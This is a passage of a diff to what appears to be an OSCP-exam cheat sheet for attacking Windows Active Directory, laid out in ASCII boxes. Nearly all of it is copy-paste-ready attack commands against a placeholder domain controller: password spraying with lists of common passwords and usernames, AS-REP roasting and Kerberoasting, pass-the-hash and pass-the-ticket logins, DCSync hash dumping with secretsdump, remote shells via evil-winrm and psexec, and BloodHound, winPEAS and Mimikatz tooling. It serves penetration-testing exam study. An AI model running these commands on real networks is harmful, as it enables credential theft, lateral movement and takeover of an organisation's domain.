+│   GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password           │
+│   bloodhound-python -d domain.local -u user -p password -c All -ns 10.10.10.10    │
+│   netexec ldap 10.10.10.10 -u user -p password --groups                           │
+│   evil-winrm -i 10.10.10.10 -u user -p password                                   │
+│   psexec.py domain.local/user:password@10.10.10.10                                │
 │                                                                                   │
-│ COMMON OSCP PASSWORDS (TRY THESE FIRST):                                          │
-│   Password123, Welcome1, Spring2024!, Company2024!, P@ssw0rd, Winter2024!,        │
-│   Summer2024!, Fall2024!, Changeme123, Admin123!, Password1, admin, password      │
+│ USER HASH:                                                                        │
+│   crackmapexec smb 10.10.10.10 -u user -H NTLM_HASH                               │
+│   evil-winrm -i 10.10.10.10 -u user -H NTLM_HASH                                  │
+│   GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user -hashes :NTLM_HASH │
+│   psexec.py domain.local/user@10.10.10.10 -hashes :NTLM_HASH                      │
+│   secretsdump.py domain.local/user@10.10.10.10 -hashes :NTLM_HASH                 │
 │                                                                                   │
-│ COMMON OSCP USERNAMES:                                                            │
-│   administrator, admin, backup, sqladmin, svc_backup, svc_sql,                    │
-│   service, test, user, guest, krbtgt                                              │
+│ KERBEROS TICKET:                                                                  │
+│   export KRB5CCNAME=ticket.ccache                                                 │
+│   GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/ -k -no-pass            │
+│   psexec.py domain.local/user@10.10.10.10 -k -no-pass                             │
+│   secretsdump.py -k -no-pass domain.local/                                        │
 │                                                                                   │
-╠══════════════════════════════════════════════════════════════════════════════════╣
-║                    ESSENTIAL COMMANDS - COPY/PASTE READY                       ║
-╚══════════════════════════════════════════════════════════════════════════════════╝
-
-│ # Get users (LDAP):                                                               │
-│ ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d" " -f2 │
-│                                                                                   │
-│ # Get users (SMB):                                                                │
-│ rpcclient -U "" -N 10.10.10.10 -c "enumdomusers" | grep -o "\[.*\]" | tr -d '[]' │
-│                                                                                   │
-│ # AS-REP Roasting:                                                                │
-│ GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -request │
-│                                                                                   │
-│ # Password spray:                                                                 │
-│ crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success  │
-│                                                                                   │
-│ # Kerberoasting (with creds):                                                     │
-│ GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password             │
-│                                                                                   │
-│ # Get shell (WinRM):                                                              │
-│ evil-winrm -i 10.10.10.10 -u user -p password                                     │
-│                                                                                   │
-│ # Get shell (Impacket):                                                           │
-│ psexec.py domain.local/user:password@10.10.10.10                                  │
-│                                                                                   │
-│ # Dump hashes (DCSync):                                                           │
-│ secretsdump.py domain.local/user:password@10.10.10.10                             │
-│                                                                                   │
-│ # BloodHound collection:                                                          │
-│ bloodhound-python -d domain.local -u user -p password -c All -ns 10.10.10.10      │
-│                                                                                   │
-│ # Check privileges (Windows shell):                                               │
-│ whoami /priv                                                                      │
-│ net user %USERNAME% /domain                                                       │
-│                                                                                   │
-│ # Quick check (30 seconds):                                                       │
-│ 1. ldapsearch -x -H ldap://TARGET -b "" -s base                                   │
-│ 2. smbclient -L //TARGET -N                                                       │
-│ 3. crackmapexec smb TARGET --users                                                │
-│ 4. GetNPUsers.py DOMAIN/ -usersfile /usr/share/seclists/Usernames/top-usernames-shortlist.txt -no-pass -dc-ip TARGET │
+│ WINDOWS SHELL:                                                                    │
+│   whoami /priv                                                                    │
+│   net user %USERNAME% /domain                                                     │
+│   net group "Domain Admins" /domain                                               │
+│   .\winPEASany.exe quiet                                                          │
+│   .\SharpHound.exe -c All                                                         │
 │                                                                                   │
 │ REMEMBER:                                                                         │
-│ 1. Always enumerate users FIRST                                                   │
-│ 2. GetNPUsers.py needs -usersfile OR specific user                                │
-│ 3. Password spraying works in 70% of OSCP boxes                                   │
-│ 4. Try common passwords FIRST                                                     │
-│ 5. BloodHound shows the path                                                      │
-│ 6. Document EVERYTHING with screenshots                                           │
+│ 1. Always start with Scenario 1 (no creds)                                        │
+│ 2. Guest account often gives SOME info                                            │
+│ 3. With ANY creds, run BloodHound immediately                                     │
+│ 4. Password spraying works in most OSCP boxes                                     │
+│ 5. Document every step with screenshots                                           │
 │                                                                                   │
-│ TOOL INSTALL (Kali):                                                              │
-│ sudo apt update && sudo apt install -y impacket-scripts bloodhound-python crackmapexec responder seclists │
-│ pip3 install --upgrade impacket                                                   │
-│ git clone https://github.com/PowerShellMafia/PowerSploit.git                      │
-│ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe │
+│ TOOLS NEEDED:                                                                     │
+│   Kali default +: impacket-scripts, bloodhound-python, crackmapexec, responder, seclists │
+│   Windows tools: winPEAS.exe, SharpHound.exe, PowerView.ps1, Rubeus.exe, Mimikatz.exe │
 │                                                                                   │
 ╚══════════════════════════════════════════════════════════════════════════════════╝
